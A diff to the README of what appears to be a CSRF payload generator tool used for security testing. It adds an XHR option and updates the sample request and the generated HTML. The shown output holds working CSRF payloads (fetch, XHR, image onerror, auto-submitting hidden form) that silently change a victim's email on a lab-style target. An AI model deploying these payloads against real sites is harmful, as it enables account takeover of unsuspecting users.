@@ -10,6 +10,7 @@ Features
     - fetch: Uses the Fetch API to execute CSRF requests programmatically.
     - onerror: Leverages the onerror event of an empty image tag for CSRF execution.
     - form: Auto-submitting HTML forms for CSRF attacks.
+    - XHR Requests 
 
 * HTML Output:
     - Generates an easy-to-use HTML file containing all the CSRF payloads for testing.
@@ -45,10 +46,11 @@ python3 csrf_generator.py request.txt
 4- Select the desired CSRF payload method:
 
     
-    1: fetch
-    2: onerror
-    3: form
-    4: All methods
+1. fetch
+2. xhr
+3. onerror
+4. form
+5. All
 View the output in the csrf_payloads.html file.
 
 
@@ -59,14 +61,14 @@ View the output in the csrf_payloads.html file.
 ---------------------------
 * Request sample :
 ```
-  POST /user/change-password HTTP/1.1
-Host: www.example.com
+POST /email/change HTTP/1.1
+Host: vulnerable-website.com
 Content-Type: application/x-www-form-urlencoded
-Content-Length: 50
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
-Cookie: sessionid=abcd1234efgh5678ijkl9012mnop3456
+Content-Length: 30
+Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE
 
-new_password=newpassword456
+email=wiener@normal-user.com
+
 ```
 
 ----------------------------
@@ -76,60 +78,44 @@ new_password=newpassword456
 ```
 
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CSRF Payloads</title>
-</head>
+<html>
+<head><title>CSRF Payloads</title></head>
 <body>
     <h1>Generated CSRF Payloads</h1>
-
-    <h2>Fetch Payload</h2>
-    <div>
-        <pre>
+<h2>Fetch Payload</h2><pre>
 <script>
-fetch("http://www.example.com/user/change-password", {
+fetch("http://vulnerable-website.com/email/change", {
     method: "POST",
-    headers: {
-        "Content-Type": "application/x-www-form-urlencoded"
-    },
-    body: "new_password=newpassword456xyy"
+    mode: "cors",
+    credentials: "include",
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    body: "email=wiener@normal-user.com"
 });
 </script>
-</pre>
-    </div>
-    <hr>
-
-    <h2>Onerror Payload</h2>
-    <div>
-        <pre>
-<img src="" onerror="fetch('http://www.example.com/user/change-password', {
+</pre><hr><h2>Xhr Payload</h2><pre>
+<script>
+var xhr = new XMLHttpRequest();
+xhr.open("POST", "http://vulnerable-website.com/email/change", true);
+xhr.withCredentials = true;
+xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+xhr.send("email=wiener@normal-user.com");
+</script>
+</pre><hr><h2>Onerror Payload</h2><pre>
+<img src="" onerror="fetch('http://vulnerable-website.com/email/change', {
     method: 'POST',
-    headers: {
-        'Content-Type': 'application/x-www-form-urlencoded'
-    }, body: 'new_password=newpassword456xyy'
+    mode: 'cors',
+    credentials: 'include',
+    headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'email=wiener@normal-user.com'
 })" style="display:none;">
-</pre>
-    </div>
-    <hr>
-
-    <h2>Form Payload</h2>
-    <div>
-        <pre>
-<form action="http://www.example.com/user/change-password" method="POST" target="hidden_iframe">
-    <input type="hidden" name="new_password" value="newpassword456xyy">
+</pre><hr><h2>Form Payload</h2><pre>
+<form action="http://vulnerable-website.com/email/change" method="POST" target="hidden_iframe">
+    <input type="hidden" name="email" value="wiener@normal-user.com">
     <script>
         document.forms[0].submit();
     </script>
 </form>
 <iframe name="hidden_iframe" style="display:none;"></iframe>
-</pre>
-    </div>
-    <hr>
-
-</body>
-</html>
+</pre><hr></body></html>
 
 ```
 
